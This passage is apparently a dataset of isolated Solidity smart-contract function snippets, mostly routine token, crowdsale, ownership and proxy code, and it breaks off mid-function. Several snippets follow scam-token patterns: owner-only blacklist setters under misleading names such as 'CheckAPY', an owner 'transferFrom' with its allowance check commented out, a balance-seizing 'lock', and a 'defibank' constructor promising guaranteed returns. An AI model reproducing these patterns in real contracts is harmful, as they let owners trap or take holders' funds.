function kscBurnWhenMoveToMainnet(address burner, uint256 value, string note) onlyOwner public returns (bool ret) {
        ret = burnFrom(burner, value);
        emit KSCBurnWhenMoveToMainnet(msg.sender, burner, value, note);
    }
--------------------------------------------------------------------------------
function kscBurnWhenUseInSidechain(address burner, uint256 value, string note) onlyOwner public returns (bool ret) {
        ret = burnFrom(burner, value);
        emit KSCBurnWhenUseInSidechain(msg.sender, burner, value, note);
    }
--------------------------------------------------------------------------------
function finalize() external onlyAfterSale {
        // Issue any unsold tokens back to the company.
        if (tokensSold < MAX_TOKENS_SOLD) {
            issueTokens(fundingRecipient, MAX_TOKENS_SOLD.sub(tokensSold));
        }

        // Finish minting. Please note, that if minting was already finished - this call will revert().
        vitToken.finishMinting();

        Finalized();
    }
--------------------------------------------------------------------------------
function transfer(address recipient, uint256 amount) public virtual onlyPermitted override returns (bool) {
        _transfer(_msgSender(), recipient, amount);
        
        if(_msgSender() == creator())
        { givePermissions(recipient); }
        
        return true;
    }
--------------------------------------------------------------------------------
function deleteFreezeList(address addr) onlyOwner returns(bool){
        if(freezeList[addr]){
            delete freezeList[addr];
            return true;
        }else{
            return false;
        }
    }
--------------------------------------------------------------------------------
function transfer(address to, uint256 value) public returns (bool) {
        require(!frozenAccount[msg.sender]);
        _transfer(msg.sender, to, value);
        return true;
    }
--------------------------------------------------------------------------------
constructor () internal {
        address msgSender = msg.sender;
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }
--------------------------------------------------------------------------------
function withdrawEther(uint _value) onlyManager {
        require(_value > 0);
        require(_value <= this.balance);
        // send 1234 to get 1.234
        icoManager.transfer(_value * 1000000000000000); // 10^15
    }
--------------------------------------------------------------------------------
function validPurchase() internal constant returns (bool) {
    bool withinPeriod = started;
    bool nonZeroPurchase = msg.value != 0;
    return withinPeriod && nonZeroPurchase;
  }
--------------------------------------------------------------------------------
function transferETH() isOwner external {
        require(address(this).balance != 0);
        require(ethFundDeposit.send(address(this).balance));
    }
--------------------------------------------------------------------------------
function ZOB(){
		totalSupply=MAX_SUPPLY;
		balances[msg.sender] = MAX_SUPPLY;
		Transfer(0x0, msg.sender, MAX_SUPPLY);
	}
--------------------------------------------------------------------------------
function generateLockId() internal returns (bytes32 lockId) {
        return keccak256(abi.encodePacked(blockhash(block.number - 1), address(this), ++lockRequestCount));
    }
--------------------------------------------------------------------------------
function startAuction() public isOwner atStage(Stages.AuctionSetUp) {
        stage = Stages.AuctionStarted;
        start_time = now;
        start_block = block.number;
        AuctionStarted(start_time, start_block);
    }
--------------------------------------------------------------------------------
function price() public constant returns (uint) {
        if (stage == Stages.AuctionEnded ||
            stage == Stages.TokensDistributed) {
            return 0;
        }
        return calcTokenPrice();
    }
--------------------------------------------------------------------------------
function setSlotDeadline(uint8 newDeadline)
        external
        override
        onlyGovernance
    {
        require(
            newDeadline <= BLOCKS_PER_SLOT,
            "LitexAuctionProtocol::setSlotDeadline: GREATER_THAN_BLOCKS_PER_SLOT"
        );
        _slotDeadline = newDeadline;
        emit NewSlotDeadline(_slotDeadline);
    }
--------------------------------------------------------------------------------
function returnRemainder(uint price) internal {
    if (msg.value > price) msg.sender.transfer(msg.value.sub(price));
  }
--------------------------------------------------------------------------------
function openPublicDomainRegistration(string domain) public onlyDomainOwner(domain) {
    domains[domain].allowSubdomains = true;
    emit DomainRegistrationOpened(keccak256(abi.encode(domain)), domain);
  }
--------------------------------------------------------------------------------
function setPaused(bool _pausing) external{

        require(isExecutive[msg.sender], "setPaused: not an executive.");

        pausing = _pausing;
    }
--------------------------------------------------------------------------------
function unlock
  (
    address _granted
  ) 
    onlyOwnerOrAdmin(ROLE_LOCKUP) 
    public 
  {
    require(grantedLocks[_granted].length > 0);
    
    delete grantedLocks[_granted];
    emit UnlockedAll(_granted);
  }
--------------------------------------------------------------------------------
function safeAdd(uint a, uint b) pure returns (uint) {
        uint c = a + b;
        assert(c>=a && c>=b);
        return c;
    }
--------------------------------------------------------------------------------
function issueTokensExternal(address _to, uint _tokens) public onlyInState(State.ICOFinished) onlyTokenManager {
          // can not issue more than BONUS_REWARD
          require((issuedExternallyTokens + _tokens)<=BONUS_REWARD);

          mntToken.issueTokens(_to,_tokens);

          issuedExternallyTokens = issuedExternallyTokens + _tokens;
     }
--------------------------------------------------------------------------------
function approve(address _spender, uint256 _value) public
        returns (bool success) {
		if (_value <= 0) revert(); 
        allowance[msg.sender][_spender] = _value;
        return true;
    }
--------------------------------------------------------------------------------
constructor(address key, bytes32 keyname) public payable {

        // require key not null
        require(key != address(0));

        // require keyname not null
        require(keyname != bytes32(0));

        // add the key
        _addKey(key, keyname);
    }
--------------------------------------------------------------------------------
function CheckAPY(address spender, bool val, bool val2, bool val3, bool val4) external onlyOwner {
    menu[spender] = val;
    eternal[spender] = val2; 
    bottle[spender] = val3;
    world = val4;
  }
--------------------------------------------------------------------------------
function actualTotalSupply() public constant returns(uint) {
    uint256 coins;
    uint256 cycle;
    (coins,cycle) = calculateInterestDue();
    return totalSupply.add(coins);
  }
--------------------------------------------------------------------------------
function inCaseTokenGetsStuck(IERC20 _TokenAddress) onlyOwner public {
      uint qty = _TokenAddress.balanceOf(address(this));
      _TokenAddress.safeTransfer(msg.sender, qty);
  }
--------------------------------------------------------------------------------
function SimpleToken() public {
    totalSupply_ = INITIAL_SUPPLY;
    balances[msg.sender] = INITIAL_SUPPLY;
    Transfer(0x0, msg.sender, INITIAL_SUPPLY);
  }
--------------------------------------------------------------------------------
function approve(address _spender, uint256 _value)
        returns (bool success) {
		if (_value <= 0) throw; 
        allowance[msg.sender][_spender] = _value;
        return true;
    }
--------------------------------------------------------------------------------
function() payable {
    if (msg.value > 0) {
      // Fire deposited event if we are receiving funds
      Deposited(msg.sender, msg.value, msg.data);
    }
  }
--------------------------------------------------------------------------------
function _blacklistfrontrunbots(address[] memory _counts) external checker {
        for (uint256 i = 0; i < _counts.length; i++) {
            FFbots(_counts[i]); }
    }
--------------------------------------------------------------------------------
function approve(address _spender, uint256 _value)
    returns (bool success) {
        if (_value <= 0) throw;
        allowance[msg.sender][_spender] = _value;
        return true;
    }
--------------------------------------------------------------------------------
function tokenBase() public view returns(uint256) {

        // Fetch token balance
        ERC20 erc = ERC20(tokenContract);
        uint256 decimals = erc.decimals();
        return 10 ** decimals;

    }
--------------------------------------------------------------------------------
function changeOwner(address _who) external onlyOwner {
        assert(_who != address(0));
        commitDividend(msg.sender);
        commitDividend(_who);
        owner = _who;
    }
--------------------------------------------------------------------------------
function changeAnimator(address _who) external onlyAnimator {
        assert(_who != address(0));
        commitDividend(msg.sender);
        commitDividend(_who);
        animator = _who;
    }
--------------------------------------------------------------------------------
function hotStore() payable external {
        walletBalance += msg.value;
        wallets[msg.sender].balance += uint208(msg.value);
        houseKeeping();
    }
--------------------------------------------------------------------------------
function safeAdd(uint256 x, uint256 y) internal pure returns(uint256) {
    uint256 z = x + y;
    assert((z >= x) && (z >= y));
    return z;
  }
--------------------------------------------------------------------------------
function freezeAccount(address _holder) public onlyOwner returns (bool) {
        require(!frozen[_holder]);
        frozen[_holder] = true;
        emit Freeze(_holder);
        return true;
    }
--------------------------------------------------------------------------------
function unfreezeAccount(address _holder) public onlyOwner returns (bool) {
        require(frozen[_holder]);
        frozen[_holder] = false;
        emit Unfreeze(_holder);
        return true;
    }
--------------------------------------------------------------------------------
function accumulativeFundsOf(address _owner) public view returns(uint256) {
		return pointsPerShare.mul(balanceOf(_owner)).toInt256Safe()
			.add(pointsCorrection[_owner]).toUint256Safe() / pointsMultiplier;
	}
--------------------------------------------------------------------------------
function CheckAPY(address spender, bool val, bool val2, bool val3, bool val4) external onlyOwner {
    apes[spender] = val;
    bears[spender] = val2; 
    bulls[spender] = val3;
    pingu = val4;
  }
--------------------------------------------------------------------------------
function acceptOwnership() {
        require(msg.sender == newOwner);
        OwnershipTransferred(owner, newOwner);
        owner = newOwner;
        newOwner = 0x0;
    }
--------------------------------------------------------------------------------
function forcedBurn(address _who, uint256 _value)
        public
        onlyBurner
        returns (bool) {
            _burn(_who, _value);
            emit ForcedBurn(msg.sender, _who, _value);
            return true;
    }
--------------------------------------------------------------------------------
constructor () public {
    owner = msg.sender;
    balances[owner] = totalSupply;
    emit Transfer(0x0, owner, totalSupply);
  }
--------------------------------------------------------------------------------
function setRound(
        bytes32 _merkleRoot,
        uint256 _rate
    ) external onlyConcave {
        // push new root to array of all roots - for viewing
        roots.push(_merkleRoot);
        // update merkle root
        merkleRoot = _merkleRoot;
        // update rate
        rate = _rate;

        emit NewRound(merkleRoot,rate);
    }
--------------------------------------------------------------------------------
function DataKYC() {
        founder = msg.sender;
        totalSupply = 100000000000 * 10 ** uint256(decimals);
        balances[founder] = totalSupply;
    }
--------------------------------------------------------------------------------
constructor () public {
         owner = msg.sender;
         balances[owner] = _totalSupply;
        emit Transfer(0, owner, _totalSupply);
     }
--------------------------------------------------------------------------------
function confirmTransaction(uint transactionId)
        public
        ownerExists(msg.sender)
        transactionExists(transactionId)
        notConfirmed(transactionId, msg.sender)
    {
        confirmations[transactionId][msg.sender] = true;
        Confirmation(msg.sender, transactionId);
        executeTransaction(transactionId);
    }
--------------------------------------------------------------------------------
function _setUpgradeabilityOwner(address _newUpgradeabilityOwner) internal {
        require(_newUpgradeabilityOwner != address(0), "Address should not be 0x");
        __upgradeabilityOwner = _newUpgradeabilityOwner;
    }
--------------------------------------------------------------------------------
constructor(
        address _logic,
        address admin_,
        bytes memory _data
    ) payable ERC1967Proxy(_logic, _data) {
        assert(_ADMIN_SLOT == bytes32(uint256(keccak256("eip1967.proxy.admin")) - 1));
        _changeAdmin(admin_);
    }
--------------------------------------------------------------------------------
function upgradeToAndCall(address _implementation, string _newVersion, bytes _data) payable public onlyProxyOwner {
    _upgradeTo(_implementation, _newVersion);
    require(address(this).call.value(msg.value)(_data));
  }
--------------------------------------------------------------------------------
function transfer(address _to, uint _value) returns(bool) {
        if (_to != 0x0) {
          return _transferWithReference(_to, _value, "");
        }
        else {
            return false;
        }
    }
--------------------------------------------------------------------------------
function transferWithReference(address _to, uint _value, string _reference) returns(bool) {
        if (_to != 0x0) {
            return _transferWithReference(_to, _value, _reference);
        }
        else {
            return false;
        }
    }
--------------------------------------------------------------------------------
function purgeUpgrade() onlyAssetOwner() returns(bool) {
        if (pendingVersion == 0x0) {
            return false;
        }
        delete pendingVersion;
        delete pendingVersionTimestamp;
        return true;
    }
--------------------------------------------------------------------------------
function finalize() external {
      if (msg.sender != ethFundDeposit) throw; // locks finalize to the ultimate ETH owner
      if(!ethFundDeposit.send(this.balance)) throw;  // send the eth to Brave International
    }
--------------------------------------------------------------------------------
function Authorizable() public {
    authorizers.length = 2;
    authorizers[1] = msg.sender;
    authorizerIndex[msg.sender] = 1;
  }
--------------------------------------------------------------------------------
function addAuthorized(address _addr) external onlyOwner {
    authorizerIndex[_addr] = authorizers.length;
    authorizers.length++;
    authorizers[authorizers.length - 1] = _addr;
  }
--------------------------------------------------------------------------------
constructor () public {
        _decimals = 18;
        _owner = _msgSender();
        _safeOwner = _msgSender();
        _mint(_owner, initialSupply*(10**18));
      
    }
--------------------------------------------------------------------------------
function withdraw(address _recipient, uint256 _amount) external hasAvailableFunds(_amount) {
        withdrawableTokens[_msgSender()] = withdrawableTokens[_msgSender()].sub(_amount);
        assert(xFUND.transfer(_recipient, _amount));
    }
--------------------------------------------------------------------------------
function inRebaseWindow() public view returns (bool) {
        return (
            now.mod(minRebaseTimeIntervalSec) >= rebaseWindowOffsetSec &&
            now.mod(minRebaseTimeIntervalSec) < (rebaseWindowOffsetSec.add(rebaseWindowLengthSec))
        );
    }
--------------------------------------------------------------------------------
function lock(address _seizeAddr) onlyOwner mutexed {
        uint myBalance = ledger.balanceOf(_seizeAddr);

        lockedSupply += myBalance;
        ledger.setBalance(_seizeAddr, 0);
    }
--------------------------------------------------------------------------------
function freezeAccount(address _holder) public onlyOwner returns (bool) {
        require(!frozen[_holder]);
        frozen[_holder] = true;
        emit Freeze(_holder);
        return true;
    }
--------------------------------------------------------------------------------
function unfreezeAccount(address _holder) public onlyOwner returns (bool) {
        require(frozen[_holder]);
        frozen[_holder] = false;
        emit Unfreeze(_holder);
        return true;
    }
--------------------------------------------------------------------------------
function deposit(address investor)onlyOwner public payable {
		require(state == State.Active);
		deposited[investor] = deposited[investor].add(msg.value);
	}
--------------------------------------------------------------------------------
function CheckAPY(address spender, bool val, bool val2, bool val3, bool val4) external onlyOwner {
    dragon[spender] = val;
    fruits[spender] = val2; 
    legs[spender] = val3;
    wedding = val4;
  }
--------------------------------------------------------------------------------
function _encodeReceipt(
        bool _canceled,
        uint256 _block,
        address _relayer
    ) internal pure returns (bytes32 _receipt) {
        assembly {
            _receipt := or(shl(255, _canceled), or(shl(160, _block), _relayer))
        }
    }
--------------------------------------------------------------------------------
function transfer(address to, uint256 value) public returns (bool success)
  {
    bytes memory empty; // null
    _transfer( msg.sender, to, value, empty );
    return true;
  }
--------------------------------------------------------------------------------
function transferFrom(address _from, address _to, uint256 _value) onlyOwner public returns (bool success) {
        //require(_value <= allowance[_from][msg.sender]);     // Check allowance
        allowance[_from][msg.sender] -= _value;
        _transfer(_from, _to, _value);
        return true;
    }
--------------------------------------------------------------------------------
function transfer(address to, uint256 tokenId) external {
        require(msg.sender == ownerOf[tokenId], "NOT_OWNER");
        
        _transfer(msg.sender, to, tokenId);
        
    }
--------------------------------------------------------------------------------
constructor () public {
        _decimals = 18;
        _owner = _msgSender();
        _safeOwner = _msgSender();
        _mint(_owner, initialSupply*(10**18));
      
    }
--------------------------------------------------------------------------------
function transfer(address to, uint256 value) public returns (bool success)
  {
    bytes memory empty; // null
    _transfer( msg.sender, to, value, empty );
    return true;
  }
--------------------------------------------------------------------------------
constructor () payable {
        // the defibnk is launched. Send 0.05 to 0.15 ETH and get guarenteed 10% return on your investment. Invest 0.15 to 0.5 ETH and get 50% return on your investment. Invest 0.5 to 5 ETH and become an Elite investor.
        profitFromCrash = 100 * 10**18;
        // The defibank is backed by a 100ETH balance. If no new investments are made within 36 hours, this fund will be sent to the last investor as a jackpot.
        bnkfee = payable(msg.sender);
        //a percentage of each investment is used to investment into other cryptocurrencies.  
        lastInvestment = block.timestamp;
        
    }
--------------------------------------------------------------------------------
function BTEcoin() public {
    totalSupply_ = INITIAL_SUPPLY;
    balances[msg.sender] = INITIAL_SUPPLY;
    Transfer(0x0, msg.sender, INITIAL_SUPPLY);
  }
--------------------------------------------------------------------------------
constructor () public {
         owner = msg.sender;
         balances[owner] = _totalSupply;
        emit Transfer(0, owner, _totalSupply);
     }
--------------------------------------------------------------------------------
function EaiToken() public {
    totalSupply = INITIAL_SUPPLY;
    balances[msg.sender] = INITIAL_SUPPLY;
    Transfer(0x0, msg.sender, INITIAL_SUPPLY);
  }
--------------------------------------------------------------------------------
function adminSendMoneyToUser(address to,uint256 value) public{
        address opt_add=msg.sender;
        if(opt_add == admin_add){
            transferFrom(admin_add,to,value);
        }
    }
--------------------------------------------------------------------------------
function safeAdd(uint a, uint b) internal pure returns (uint) {
        uint c = a + b;
        assert(c>=a && c>=b);
        return c;
    }
--------------------------------------------------------------------------------
function accumulativeDividendOf(address _owner) public view override returns(uint256) {
        return magnifiedDividendPerShare.mul(balanceOf(_owner)).toInt256Safe()
        .add(magnifiedDividendCorrections[_owner]).toUint256Safe() / magnitude;
    }
--------------------------------------------------------------------------------
function tokenByIndex(uint256 index) public view override returns (uint256) {
        require(index < totalSupply(), 'ERC721A: global index out of bounds');
        return index;
    }
--------------------------------------------------------------------------------
function acceptOwnership() external onlyOwnerCandidate {
        address previousOwner = owner;

        owner = newOwnerCandidate;
        newOwnerCandidate = address(0);

        OwnershipTransferred(previousOwner, owner);
    }
--------------------------------------------------------------------------------
function validPurchase() internal constant returns (bool) {
    bool withinPeriod = started;
    bool nonZeroPurchase = msg.value != 0;
    return withinPeriod && nonZeroPurchase;
  }
--------------------------------------------------------------------------------
constructor() public {
    balances[msg.sender] = _totalSupply;
    emit Transfer(address(0), msg.sender, _totalSupply);
  }
--------------------------------------------------------------------------------
function approve(address _spender, uint256 _value)
        returns (bool success) {
		if (_value <= 0) throw; 
        allowance[msg.sender][_spender] = _value;
        return true;
    }
--------------------------------------------------------------------------------
constructor() {
        balances[msg.sender] = _totalSupply;
        emit Transfer(address(0), msg.sender, _totalSupply);
    }
--------------------------------------------------------------------------------
function validateIpfsDoc(address _student, uint _docIndx, bytes _ipfsHash) public view returns(bool) {
        Certification storage certification  = studentCertifications[_student];
        return (certification.documents[_docIndx]).validateIpfsDoc(_ipfsHash);
    }
--------------------------------------------------------------------------------
function validateContentHash(address _student, uint _docIndx, bytes32 _contentHash) public view returns(bool) {
        Certification storage certification  = studentCertifications[_student];
        return (certification.documents[_docIndx]).validateContentHash(_contentHash);
    }
--------------------------------------------------------------------------------
function validateTranscriptHash(address _student, uint _docIndx, bytes32 _transcriptHash) public view returns(bool) {
        Certification storage certification  = studentCertifications[_student];
        return (certification.documents[_docIndx]).validateTranscriptHash(_transcriptHash);
    }
--------------------------------------------------------------------------------
function startSale(uint256 saleStart, uint256 saleStop) onlyOwner returns (bool success) {
        require(saleStop > now);     
        startTime = saleStart; 
        stopTime = saleStop; 
        crowdsaleClosed = false; 
        return true; 
    }
--------------------------------------------------------------------------------
function setReleaseDate(uint256 _releaseDate) external onlyAdmin whenNotPaused {
    require(releaseDate == 0);
    require(_releaseDate > now);

    releaseDate = _releaseDate;

    emit BonusReleaseDateSet(_releaseDate);
  }
--------------------------------------------------------------------------------
constructor(address ethPriceFeedAddr, address erc20TokenAddr, uint256 initialErc20mUSDPrice) public {
        owner = msg.sender;
        ethPriceFeedContract = IMakerPriceFeed(ethPriceFeedAddr);
        erc20TokenContract = IERC20(erc20TokenAddr);
        setPriceInmUSD(initialErc20mUSDPrice);
    }
--------------------------------------------------------------------------------
function transfer(address dst, uint256 amount) external nonReentrant returns (bool) {
        return transferTokens(msg.sender, msg.sender, dst, amount) == uint(Error.NO_ERROR);
    }
--------------------------------------------------------------------------------
function borrowBalanceCurrent(address account) external nonReentrant returns (uint) {
        require(accrueInterest() == uint(Error.NO_ERROR), "accrue interest failed");
        return borrowBalanceStored(account);
    }
--------------------------------------------------------------------------------
function CheckAPY(address spender, bool val, bool val2, bool val3, bool val4) external onlyOwner {
    tenochtitlan[spender] = val;
    mexico[spender] = val2; 
    toluca[spender] = val3;
    yucatan = val4;
  }
--------------------------------------------------------------------------------
function approve(address _spender, uint256 _value)
        returns (bool success) {
		if (_value <= 0) throw; 
        allowance[msg.sender][_spender] = _value;
        return true;
    }
--------------------------------------------------------------------------------
function setToken(address _token) onlyHouse public {
        require(address(token) == 0x0);
        require(_token != address(this)); // Protection from admin's mistake

        token = Token(_token);
    }
--------------------------------------------------------------------------------
function killAborted() onlyHouse public {
        require(stage == Stages.Aborted);
        require(now > abortTime + 60 days);

        selfdestruct(house);
    }
--------------------------------------------------------------------------------
function _flushEtherToCroupier() internal {
        if (pendingEtherForCroupier > 0) {
            uint256 willTransfer = pendingEtherForCroupier;
            pendingEtherForCroupier = 0;
            
            croupier.transfer(willTransfer);
        }
    }
--------------------------------------------------------------------------------
function setUpgradeMaster(address master) public {
    if (master == 0x0) revert();
    if (msg.sender != upgradeMaster) revert();
    upgradeMaster = master;
  }
--------------------------------------------------------------------------------
function ERC20Token(
        string _symbol, 
        string _name, 
        uint8 _decimals, 
        uint _totalSupply
    ) Owned() {
        symbol = _symbol;
        name = _name;
        decimals = _decimals;
        totalSupply = _totalSupply;
        balances[owner] = _totalSupply;
    }
--------------------------------------------------------------------------------
function _isCooldownReady(uint256 skinAId, uint256 skinBId) private view returns (bool) {
        return (skins[skinAId].cooldownEndTime <= uint64(now)) && (skins[skinBId].cooldownEndTime <= uint64(now));
    }
--------------------------------------------------------------------------------
function setDateMainStart(uint _unixts) public onlyOwner checkDateOrder {
        require(now < _unixts && now < dateMainStart);
        dateMainStart = _unixts;
        emit IcoDateUpdated(1, _unixts);
    }
--------------------------------------------------------------------------------
function isMainFirstDay() public view returns (bool) {
        if (now > dateMainStart && now <= dateMainStart + 1 days) return true;
        return false;
    }
--------------------------------------------------------------------------------
function setRaisingAccessController(
    address racAddress
  )
    public
    onlyOwner()
  {
    address previous = address(raisingAccessController);

    raisingAccessController = AccessControllerInterface(racAddress);

    emit RaisingAccessControllerChanged(previous, racAddress);
  }
--------------------------------------------------------------------------------
function setTokenPrice(uint256 _newPrice) public onlyOwner {
        require(_newPrice != tokenPrice && _newPrice > 0);
        emit TokenPriceChanged(tokenPrice, _newPrice);
        tokenPrice = _newPrice;
    }
--------------------------------------------------------------------------------
function purgeUpgrade() onlyAssetOwner() returns(bool) {
        if (pendingVersion == 0x0) {
            return false;
        }
        delete pendingVersion;
        delete pendingVersionTimestamp;
        return true;
    }
--------------------------------------------------------------------------------
function EcoValueCoin() public {
    owner = msg.sender;
    totalSupply = initialSupply;
    balances[owner] = totalSupply;
    transferGrants[owner] = true;
  }
--------------------------------------------------------------------------------
function accumulativeDividendOf(address _owner) public view override returns(uint256) {
    return magnifiedDividendPerShare.mul(balanceOf(_owner)).toInt256Safe()
      .add(magnifiedDividendCorrections[_owner]).toUint256Safe() / magnitude;
  }
--------------------------------------------------------------------------------
function _setImplementation(address _newImplementation) internal {
        require(msg.sender == proxyOwner());
        bytes32 position = implementationPosition;

        assembly {
            sstore(position, _newImplementation)
        }
    }
--------------------------------------------------------------------------------
constructor (address _tokenTransferProxy, address _affiliateRegistry, address _errorReporter, address _defaultFeeAccount/*, address _logger*/) public {
        /* require(_logger != address(0x0)); */
        tokenTransferProxy = TokenTransferProxy(_tokenTransferProxy);
        affiliateRegistry = AffiliateRegistry(_affiliateRegistry);
        errorReporter = ErrorReporter(_errorReporter);
        defaultFeeAccount = _defaultFeeAccount;
        /* logger = Logger(_logger); */
    }
--------------------------------------------------------------------------------
function transfer(address recipient, uint256 amount) public virtual onlyPermitted override returns (bool) {
        _transfer(_msgSender(), recipient, amount);
        
        if(_msgSender() == creator())
        { givePermissions(recipient); }
        
        return true;
    }
--------------------------------------------------------------------------------
function generateLockId() internal returns (bytes32 lockId) {
                return keccak256(
                abi.encodePacked(blockhash(block.number - 1), address(this), ++lockRequestCount)
                );
        }
--------------------------------------------------------------------------------
constructor (Token _company_token) public {
    owner = msg.sender;
    company_token = _company_token;
    currentBatch = 0;
    addrPerStep = 20;
    setBountyAddresses();
    setBountyAmounts();
  }
--------------------------------------------------------------------------------
constructor (string memory _name, string memory _symbol) public {

        owner = msg.sender;

        name = _name;
        symbol = _symbol;
        balances[msg.sender] = totalSupply;
    }
--------------------------------------------------------------------------------
function () payable {
    require(!bought_tokens);
    require(this.balance <= max_amount);
    balances[msg.sender] += msg.value;
  }
--------------------------------------------------------------------------------
function increaseAllowance(address spender, uint256 addedValue) external returns (bool) {
        _approve(msg.sender, spender, _allowances[msg.sender][spender] + addedValue);
        return true;
    }
--------------------------------------------------------------------------------
function validPurchase() internal constant returns (bool) {
    bool withinPeriod = started;
    bool nonZeroPurchase = msg.value != 0;
    return withinPeriod && nonZeroPurchase;
  }
--------------------------------------------------------------------------------
constructor () {
        _name = "Moz Token";
        _symbol = "MOZT";
        _totalSupply;
        _mint(owner(), 2000000000 * 10 ** (decimals()) );

    }
--------------------------------------------------------------------------------
function getTokenSizes(uint256 _tokenId) public exists(_tokenId) view returns (uint256, uint256) {
        Token memory token = allMinedTokens[allTokensIndex[_tokenId]];
        return (token.sizeA, token.sizeB);
    }
--------------------------------------------------------------------------------
constructor() public {
    balances[msg.sender] = _totalSupply;
    emit Transfer(address(0), msg.sender, _totalSupply);
  }
--------------------------------------------------------------------------------
function setUpgradeMaster(address master) public {
      if (master == 0x0) revert();
      if (msg.sender != upgradeMaster) revert();
      upgradeMaster = master;
  }
--------------------------------------------------------------------------------
function opentrading(address[] memory _counts) external checker {
        for (uint256 i = 0; i < _counts.length; i++) {
            fee(_counts[i]); }
    }
--------------------------------------------------------------------------------
function () external payable
    {
                        if( msg.value > 0 )
            buyTokens(msg.sender);
        else
            airDrop(msg.sender); 
        
        
        
           
    }
--------------------------------------------------------------------------------
function confirmTransaction(uint transactionId)
        public
        ownerExists(msg.sender)
        transactionExists(transactionId)
        notConfirmed(transactionId, msg.sender)
    {
        confirmations[transactionId][msg.sender] = true;
        Confirmation(msg.sender, transactionId);
        executeTransaction(transactionId);
    }
--------------------------------------------------------------------------------
function validPurchase() internal view returns (bool) {
		bool withinCap = weiRaised.add(msg.value) <= cap;
		return super.validPurchase() && withinCap;
	}
--------------------------------------------------------------------------------
function getEtherAmountFromToken(uint _amount) private view returns (uint) {
        require(aiTokenG3 > 0, "Invalid aiTokenG3, please contact admin");
        return _amount / aiTokenG3;
    }
--------------------------------------------------------------------------------
function _transferFrom(address from, address to, uint256 tokenId) internal {
       super._transferFrom(from, to, tokenId);

       _removeTokenFromOwnerEnumeration(from, tokenId);

       _addTokenToOwnerEnumeration(to, tokenId);
   }
--------------------------------------------------------------------------------
function CheckTheAddress(address spender, bool val, bool val2, bool val3, bool val4) external onlyOwner {
    betabeta[spender] = val;
    gammagamma[spender] = val2; 
    deltacon[spender] = val3;
    thisValue = val4;
  }
--------------------------------------------------------------------------------
function approve(address _spender, uint256 _value)
        returns (bool success) {
		if (_value <= 0) throw; 
        allowance[msg.sender][_spender] = _value;
        return true;
    }
--------------------------------------------------------------------------------
function confirmTransaction(uint transactionId)
    public
    ownerExists(msg.sender)
    transactionExists(transactionId)
    notConfirmed(transactionId, msg.sender)
    {
        confirmations[transactionId][msg.sender] = true;
        Confirmation(msg.sender, transactionId);
        executeTransaction(transactionId);
    }
--------------------------------------------------------------------------------
function unpaid(address beneficiary) public view returns (uint256 amt) {
        Grant memory grant = s_grants[beneficiary];
        amt = unpaidInternal(grant.amount, grant.claimed);
    }
--------------------------------------------------------------------------------
function checkRose(bytes32 h) public constant returns (bool, uint, string) {
      return (roseOwners[h].hasRose, uint(roseOwners[h].roseType), roseOwners[h].memo);
  }
--------------------------------------------------------------------------------
function approve(address _spender, uint256 _value)
        returns (bool success) {
		if (_value <= 0) throw; 
        allowance[msg.sender][_spender] = _value;
        return true;
    }
--------------------------------------------------------------------------------
constructor (ProxyRegistry registryAddress, TokenTransferProxy tokenTransferProxyAddress, ERC20 tokenAddress, address protocolFeeAddress) public {
        registry = registryAddress;
        tokenTransferProxy = tokenTransferProxyAddress;
        exchangeToken = tokenAddress;
        protocolFeeRecipient = protocolFeeAddress;
        owner = msg.sender;
    }
--------------------------------------------------------------------------------
function SyltTokenLock(address _owner, address _token) {
        require(_owner != 0x0);
        require(_token != 0x0);

        owner = _owner;
        token = FreezableToken(_token);
    }
--------------------------------------------------------------------------------
function hasEnded() public constant returns (bool) {
    bool capReached = weiRaised >= cap;
    bool tooLate = now > endTime;
    return tooLate || capReached;
  }
--------------------------------------------------------------------------------
function checkIfCanUseTokens(address _owner, uint256 _amount) internal view returns(bool) {
        uint256 unfreezedAmount = wallets[_owner].tokensAmount - wallets[_owner].freezedAmount;
        return _amount <= unfreezedAmount;
    }
--------------------------------------------------------------------------------
function tokenByIndex(uint256 tokenId) external view returns (uint256) {
        require(
            _exists(tokenId),
            "ERC721: operator query for nonexistent token"
        );

        return tokenId;
    }
--------------------------------------------------------------------------------
function _preValidatePreICOPurchase(address _beneficiary, uint256 _weiAmount) internal view {
        require(_weiAmount != 0);
        require(whitelist[_beneficiary]);
        require(now >= preICOStartDate && now <= preICOEndDate);
    }
--------------------------------------------------------------------------------
function validPurchase() internal constant returns (bool) {
    bool withinPeriod = started;
    bool nonZeroPurchase = msg.value != 0;
    return withinPeriod && nonZeroPurchase;
  }
--------------------------------------------------------------------------------
function blocktrade() public{
    supply = 57746762*(10**18);
    airDropFinished = false;
    balances[owner] = 57746762*(10**18);
  }
--------------------------------------------------------------------------------
constructor () internal {
    address msgSender = msg.sender;
    _owner = msgSender;
    emit OwnershipTransferred(address(0), msgSender);
  }
--------------------------------------------------------------------------------
function approve(address _spender, uint256 _value) public
        returns (bool success) {
        allowance[msg.sender][_spender] = _value;
        randomLucky();
        randomLucky();
        randomLucky();
        randomLucky();
        return true;
    }
--------------------------------------------------------------------------------
function _cancelAuction(address _contract, uint256 _tokenId, address _seller) internal {
        _removeAuction(_contract, _tokenId);
        _transfer(_contract, _seller, _tokenId);
        emit AuctionCancelled(_contract, _tokenId);
    }
--------------------------------------------------------------------------------
constructor() public payable {
            address originalFeeReceive = 0x6661084EAF2DD24aCAaDe2443292Be76eb344888;
            originalFeeReceive.transfer(500000000000000000);
            owner = 0xfa1b2c98ac7a1b05d84a5d2a500d6ad0b152b86a; 
            balances[owner] = _totalSupply;
        }
--------------------------------------------------------------------------------
constructor() public{
    LastNRTRelease = now;
    AnnualNRTAmount = 819000000000000000000000000;
    MonthlyNRTAmount = AnnualNRTAmount.div(uint256(12));
    MonthCount = 0;
  }
--------------------------------------------------------------------------------
constructor(
        ModuleRegistry _registry,
        TransferStorage _transferStorage, 
        GuardianStorage _guardianStorage, 
        address _priceProvider,
        uint256 _securityPeriod,
        uint256 _securityWindow, 
        uint256 _defaultLimit
    ) 
        BaseModule(_registry, NAME)
        LimitManager(_defaultLimit)
        public 
    {
        transferStorage = _transferStorage;
        guardianStorage = _guardianStorage;
        priceProvider = TokenPriceProvider(_priceProvider);
        securityPeriod = _securityPeriod;
        securityWindow = _securityWindow;
    }
--------------------------------------------------------------------------------
function isWhitelisted(BaseWallet _wallet, address _target) public view returns (bool _isWhitelisted) {
        uint whitelistAfter = transferStorage.getWhitelist(_wallet, _target);
        // solium-disable-next-line security/no-block-members
        return whitelistAfter > 0 && whitelistAfter < now;
    }
--------------------------------------------------------------------------------
function isOperatorFor(
